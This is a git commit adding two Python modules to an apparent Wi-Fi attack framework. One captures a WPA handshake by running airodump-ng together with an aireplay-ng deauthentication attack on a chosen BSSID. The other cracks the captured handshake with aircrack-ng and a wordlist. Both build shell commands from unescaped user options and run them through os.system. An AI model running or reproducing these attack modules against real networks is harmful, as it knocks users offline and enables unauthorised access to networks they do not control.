4cc31015620dc5d7c1dc78fd67f9dfa8b9a3a0e4
Amer Araibia <46226856+ameraraibia168@users.noreply.github.com>
2024-07-12 21:48:08 +0100

    Add files via upload

---
+++ waf/modules/wireless/wifi/attack/crack_handshake.py
@@ -0,0 +1,41 @@
+import time,os
+from waf.libs.color  import *
+from waf.libs import variable as var
+
+info = {
+        "name"        : "carcking_handshake",
+        "title"       : "Cracking handshake of network ",
+        "module"      : "wireless/wifi/attack cracking handshake network  network_manager",
+        "description" : "cracking handshake of network"
+}
+
+options ={
+  "PATH"      : [str(var.path[0]),'enter the path of the handshake file'],
+  "WORDLIST"  : [str(var.wordlist[0]),'enter the path of the wordlist']
+
+}
+
+def running():
+        try:
+                print ("")
+                print (blue+"[*]"+default+ "Starting a crack handshake")
+                time.sleep(2)
+                print ("")
+                time.sleep(2)
+                print ("") 
+                order = ("aircrack-ng {} -w {}").format(var.path[0],var.wordlist[0])
+                geny = os.system(order)
+                print("\n")
+                print (green_underline+"[*] Done"+default)
+                time.sleep(2)
+                print ("")
+        except Exception as e:
+                print(red+"\n[-]"+default+"Error : "+str(e))
+
+
+
+
+
+
+
+        
---
+++ waf/modules/wireless/wifi/attack/getting_handshake.py
@@ -0,0 +1,36 @@
+import time,os
+from waf.libs.color  import *
+from waf.libs import variable as var
+
+info = {
+        "name"        : "getting_handshake",
+        "title"       : "Getting handshake of network ",
+        "module"      : "wireless/wifi/attack getting handshake network  network_manager",
+        "description" : "getting handshake of network"
+}
+
+options ={
+  "INTERFACE" : [str(var.interface[0]),'enter the interface [wlan0/wlan0mon]'],
+  "BSSID"     : [str(var.bssid[0]),'enter the bssid of the target'],
+  "CHANNEL"   : [str(var.channel[0]),'enter the channel of the network'],
+  "PATH"      : [str(var.path[0]),'enter the path of the output file'],
+  "DIST"      : [str(var.dist[0]),'enter the number of the packets [1-10000] ( 0 for unlimited number)']
+
+}
+
+def running():
+        try:
+                print ("")
+                print (blue+"[*]"+default+ "Starting a getting handshake")
+                time.sleep(2)
+                print ("")
+                time.sleep(2)
+                print ("") 
+                order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(var.interface[0],var.bssid[0],var.channel[0],var.path[0],var.dist[0],var.bssid[0],var.interface[0])
+                geny = os.system(order)
+                print("\n")
+                print (green_underline+"[*] Done"+default)
+                time.sleep(2)
+                print ("")
+        except Exception as e:
+                print(red+"\n[-]"+default+"Error : "+str(e))
